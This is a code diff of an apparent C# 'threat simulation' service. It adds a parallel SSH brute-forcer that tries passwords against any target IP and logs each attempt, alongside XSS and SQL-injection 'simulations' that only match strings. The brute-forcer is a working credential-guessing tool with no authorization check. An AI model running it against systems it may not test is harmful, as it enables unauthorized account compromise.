@@ -1,64 +1,119 @@
+// Services/ThreatSimulationService.cs
+using MongoDB.Driver;
+using System.Linq;
 using Renci.SshNet;
-
+using System.Collections.Concurrent;
 public class ThreatSimulationService
 {
-    private readonly ThreatLogService _logService;
+    private readonly MongoLogService _mongo;
+    public ThreatSimulationService(MongoLogService mongo) => _mongo = mongo;
 
-    public ThreatSimulationService(ThreatLogService logService)
+    /* ----------  BRUTE FORCE  ---------- */
+    public async Task<IReadOnlyCollection<ThreatLog>> SimulateBruteAsync(
+        BruteForceRequest req,
+        int maxParallel            = 50,
+        int timeoutMs              = 3_000,
+        bool stopAfterFirstHit     = false)
     {
-        _logService = logService;
-    }
+        /* ----------------   PREPARE WORD‑LIST   ---------------- */
+        var sourcePwds = (req.Passwords?.Any() == true)
+            ? req.Passwords
+            : Enumerable.Range(1, req.AttemptCount).Select(i => $"guess{i:000}");
 
-    // 1) Brute Force
-    public async Task<List<ThreatLog>> SimulateBruteForce(string targetIp, string username, List<string> passwords)
-    {
-        var logs = new List<ThreatLog>();
+        // If AttemptCount limits the run, respect it — otherwise run whole list
+        var pwds = (req.AttemptCount > 0 ? sourcePwds.Take(req.AttemptCount) : sourcePwds).ToArray();
 
-        foreach (var pwd in passwords)
+        /* ----------------   SET‑UP CONCURRENCY   ---------------- */
+        using var throttler = new SemaphoreSlim(maxParallel);
+        using var cts       = new CancellationTokenSource();
+        var logs            = new ConcurrentBag<ThreatLog>();
+
+        var tasks = pwds.Select(async pwd =>
         {
-            var success = false;
+            await throttler.WaitAsync(cts.Token);
             try
             {
-                using var client = new SshClient(targetIp, username, pwd);
-                client.Connect();
-                success = client.IsConnected;
-                client.Disconnect();
-            }
-            catch
-            {
-                success = false;
-            }
+                if (cts.IsCancellationRequested) return; // short‑circuit
 
-            var logEntry = new ThreatLog
+                bool ok;
+                try
+                {
+                    using var ssh     = new SshClient(req.TargetIp, req.Username, pwd)
+                    {
+                        ConnectionInfo = { Timeout = TimeSpan.FromMilliseconds(timeoutMs) }
+                    };
+                    ssh.Connect();
+                    ok = ssh.IsConnected;
+                    ssh.Disconnect();
+                }
+                catch
+                {
+                    ok = false;
+                }
+
+                var log = new ThreatLog
+                {
+                    Timestamp  = DateTime.UtcNow,
+                    Target     = req.TargetIp,
+                    AttackType = AttackKind.BRUTE_FORCE,
+                    Result     = ok,
+                    ExtraInfo  = $"user={req.Username}; pwd={pwd}",
+                    IP         = req.SourceIp ?? string.Empty
+                };
+                logs.Add(log);
+
+                if (ok && stopAfterFirstHit)
+                {
+                    // success -> signal cancellation to any awaiting tasks
+                    cts.Cancel();
+                }
+            }
+            finally
             {
-                Timestamp = DateTime.UtcNow,
-                Target = targetIp,
-                AttackType = "BRUTE_FORCE",
-                Result = success,
-                IP = "" // or the user's machine IP if you want
-            };
-            await _logService.InsertLogAsync(logEntry);
-            logs.Add(logEntry);
+                throttler.Release();
+            }
+        });
+
+        await Task.WhenAll(tasks);
+
+        /* ----------------   BULK‑WRITE TO MONGO   ---------------- */
+        if (!logs.IsEmpty)
+        {
+            await _mongo.InsertManyAsync(logs); // extension added to MongoLogService
         }
 
-        return logs;
+        return logs.ToArray();
     }
 
-    // 2) Fake XSS
-    public async Task<ThreatLog> SimulateFakeXss(string targetUrl, string payload)
+    /* ----------  XSS  ---------- */
+    public async Task<ThreatLog> SimulateXssAsync(XssRequest req)
     {
-        // In real life, you'd try to inject <script> etc. into the target
-        // We'll just "simulate" it
-        var success = payload.Contains("<script"); // silly check or always false
+        var success = req.Payload.Contains("<script", StringComparison.OrdinalIgnoreCase);
 
-        var logEntry = new ThreatLog
+        var log = new ThreatLog
         {
-            Timestamp = DateTime.UtcNow,
-            Target = targetUrl,
-            AttackType = "XSS",
-            Result = success
+            Target = req.TargetUrl,
+            AttackType = AttackKind.XSS,
+            Result = success,
+            ExtraInfo = $"payload={req.Payload}"
         };
-        await _logService.InsertLogAsync(logEntry);
-        return logEntry;
+        await _mongo.InsertAsync(log);
+        return log;
     }
+
+    // /* ----------  SQL INJECTION  ---------- */
+    // public async Task<ThreatLog> SimulateSqlAsync(SqlRequest req)
+    // {
+    //     var success = req.Query.Contains("SELECT", StringComparison.OrdinalIgnoreCase);
+    //
+    //     var log = new ThreatLog
+    //     {
+    //         Target = req.TargetUrl,
+    //         AttackType = AttackKind.SQL_INJECTION,
+    //         Result = success,
+    //         ExtraInfo = $"query={req.Query}"
+    //     };
+    //     await _mongo.InsertAsync(log);
+    //     return log;
+    // }
 }
